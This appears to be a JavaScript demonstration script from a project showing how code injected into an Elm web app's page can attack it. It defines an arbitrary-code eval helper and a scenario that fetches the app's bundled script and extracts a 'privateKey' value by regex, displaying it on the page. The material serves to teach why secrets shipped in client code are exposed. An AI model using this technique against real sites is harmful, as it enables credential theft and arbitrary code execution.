(function (body) {
    "use strict";

    console.log("🤬 [body-compromised-after-app-init]");

    function httpGet(url, next) {
        let xhr = new XMLHttpRequest();
        xhr.open("GET", url, true);
        xhr.onreadystatechange = function () {
            if (xhr.readyState !== XMLHttpRequest.DONE) {
                return;
            }

            if (xhr.status === 0 || xhr.status >= 200 && xhr.status < 400) {
                next(null, xhr.responseText);
            } else {
                const error = new Error(xhr.responseText);
                error.status = xhr.status;
                error.statusText = xhr.statusText;
                next(error);
            }

            xhr = null;
        };

        xhr.send(null);
    }

    function globalEval(arbitraryCode) {
        // (0, eval)(arbitraryCode);
        // return;

        // https://github.com/jquery/jquery/blob/master/src/core/DOMEval.js
        var preservedScriptAttributes = {
            type: true,
            src: true,
            nonce: true,
            noModule: true
        };

        function DOMEval( code, node, doc ) {
            doc = doc || document;

            var i, val,
            script = doc.createElement( "script" );

            script.text = code;
            if ( node ) {
                for ( i in preservedScriptAttributes ) {

                    // Support: Firefox <=64 - 66+, Edge <=18+
                    // Some browsers don't support the "nonce" property on scripts.
                    // On the other hand, just using `getAttribute` is not enough as
                    // the `nonce` attribute is reset to an empty string whenever it
                    // becomes browsing-context connected.
                    // See https://github.com/whatwg/html/issues/2369
                    // See https://html.spec.whatwg.org/#nonce-attributes
                    // The `node.getAttribute` check was added for the sake of
                    // `jQuery.globalEval` so that it can fake a nonce-containing node
                    // via an object.
                    val = node[ i ] || node.getAttribute && node.getAttribute( i );
                    if ( val ) {
                        script.setAttribute( i, val );
                    }
                }
            }
            doc.head.appendChild( script ).parentNode.removeChild( script );
        }

        DOMEval(arbitraryCode);
    }

    function scenario(name, fn) {
        const storyboard = document.querySelector("#storyboard");
        const scenarioNode = document.createElement("li");
        scenarioNode.classList.add("mt-4");

        const title = document.createElement("h2");
        title.classList.add("font-bold");
        title.classList.add("mb-2");
        title.classList.add("text-2xl");
        title.innerText = name;

        const contentNode = document.createElement("ol");
        contentNode.classList.add("list-decimal");
        contentNode.classList.add("list-inside");

        scenarioNode.appendChild(title);
        scenarioNode.appendChild(contentNode);

        storyboard.appendChild(scenarioNode);

        let lastNode = title;

        fn(function log(line) {
            const node = document.createElement("li");
            node.innerText = line;
            contentNode.appendChild(node);
            lastNode = node;
        }, function remarks() {
            const remarkNode = document.createElement("p");
            remarkNode.classList.add("bg-gray-200");
            remarkNode.classList.add("border-l-4");
            remarkNode.classList.add("border-gray-400");
            remarkNode.classList.add("italic");
            remarkNode.classList.add("mb-2");
            remarkNode.classList.add("pb-1");
            remarkNode.classList.add("pl-2");
            remarkNode.classList.add("pt-1");
            remarkNode.innerText = [].join.call(arguments, " ");
            lastNode.parentNode.insertBefore(remarkNode, lastNode.nextSibling);
        }, globalEval);
    }

    body(scenario, httpGet);

}(function (scenario, httpGet) {

    scenario("Extracting 'privateKey' from the included source code", function (log, remarks) {
        remarks(
            "This attack requires the author to have a look at the document structure and the source code.",
            "It is harder to accomplish with an --optimize build due to record field names being mangled, but not impossible.",
        );

        log("Looking for the script of the Elm app...");
        const script = document.querySelector("[src*='dist\/app']");

        log("Pulling the source via XHR...");
        httpGet(script.src, function (err, code) {
            if (err) {
                throw err;
            }

            log("Got the code, grabbing 'privateKey' via regex...");
            let privateKey = null;
            code.replace(/(?:privateKey|M)\s*:\s*(?:'|")([^"']+)(?:'|")/, function (_, extracted) {
                privateKey = extracted;
            });

            if (privateKey) {
                log("Found the private key: " + privateKey);
            } else {
                log("Could not extract private key");
            }
        });

    });

}));
